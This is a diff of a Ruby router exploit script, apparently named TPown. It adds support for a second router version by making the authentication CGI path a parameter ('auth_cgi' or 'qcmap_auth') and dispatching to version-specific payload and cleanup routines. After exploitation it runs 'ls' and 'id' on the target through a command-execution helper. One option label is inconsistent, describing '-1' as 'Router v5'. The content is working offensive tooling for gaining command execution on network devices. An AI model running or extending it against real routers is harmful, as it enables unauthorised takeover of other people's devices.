@@ -113,10 +113,10 @@ class TPown
     end
 
 
-    def login()
+    def login(cgi_path)
 
         login_data = {"module": "authenticator", "action": 0}.to_json
-        res = Curl.post("http://#{@options[:target]}/cgi-bin/auth_cgi", login_data) do |http|
+        res = Curl.post("http://#{@options[:target]}/cgi-bin/#{cgi_path}", login_data) do |http|
             http.headers["Content-Type"] = "application/json"
         end
 
@@ -130,7 +130,7 @@ class TPown
 
         login_data = {"module": "authenticator", "action": 1, "digest": digest}.to_json
 
-        res = Curl.post("http://#{@options[:target]}/cgi-bin/auth_cgi", login_data) do |http|
+        res = Curl.post("http://#{@options[:target]}/cgi-bin/#{cgi_path}", login_data) do |http|
             http.headers["Content-Type"] = "application/json"
         end
         data = JSON.parse(res.body)
@@ -179,13 +179,26 @@ OptionParser.new do |opts|
     tp.options[:version] = 5
   end
 
+  opts.on("-1", "Router v5") do |v|
+    tp.options[:version] = 1
+  end
+
 end.parse!
 
-tp.login()
+
 
 if tp.options[:version] == 5
+    tp.login("auth_cgi")
     tp.payload_v5()
     tp.cleanup_v5()
 
 end
+
+if tp.options[:version] == 1
+    tp.login("qcmap_auth")
+    tp.payload_v1()
+    tp.cleanup_v1()
+
+end
 puts tp.cmd("ls")
+p tp.cmd("id")
